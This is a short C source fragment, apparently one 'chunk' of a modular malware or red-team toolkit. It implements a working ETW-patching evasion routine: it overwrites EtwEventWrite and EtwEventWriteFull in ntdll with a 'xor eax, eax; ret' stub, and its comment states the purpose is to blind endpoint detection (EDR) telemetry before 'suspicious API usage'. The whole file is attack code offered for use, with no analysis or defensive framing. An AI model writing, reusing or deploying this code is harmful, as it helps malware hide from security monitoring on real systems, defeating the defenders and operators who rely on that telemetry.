// chunk: evasion/etw_patch
// depends: (none)
// provides: patch_etw
// headers: windows.h
// risk: medium
// note: Patches EtwEventWrite to return 0 — blinds EDR ETW telemetry. Call before any suspicious API usage.

#ifndef CHUNK_ETW_PATCH
#define CHUNK_ETW_PATCH

static int patch_etw(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    void *targets[] = {
        GetProcAddress(ntdll, "EtwEventWrite"),
        GetProcAddress(ntdll, "EtwEventWriteFull"),
    };

    for (int i = 0; i < 2; i++) {
        unsigned char *addr = (unsigned char *)targets[i];
        if (!addr) continue;

        DWORD old;
        if (!VirtualProtect(addr, 3, PAGE_EXECUTE_READWRITE, &old))
            continue;

        addr[0] = 0x33; // xor eax, eax
        addr[1] = 0xC0;
        addr[2] = 0xC3; // ret
        VirtualProtect(addr, 3, old, &old);
    }
    return 1;
}

#endif
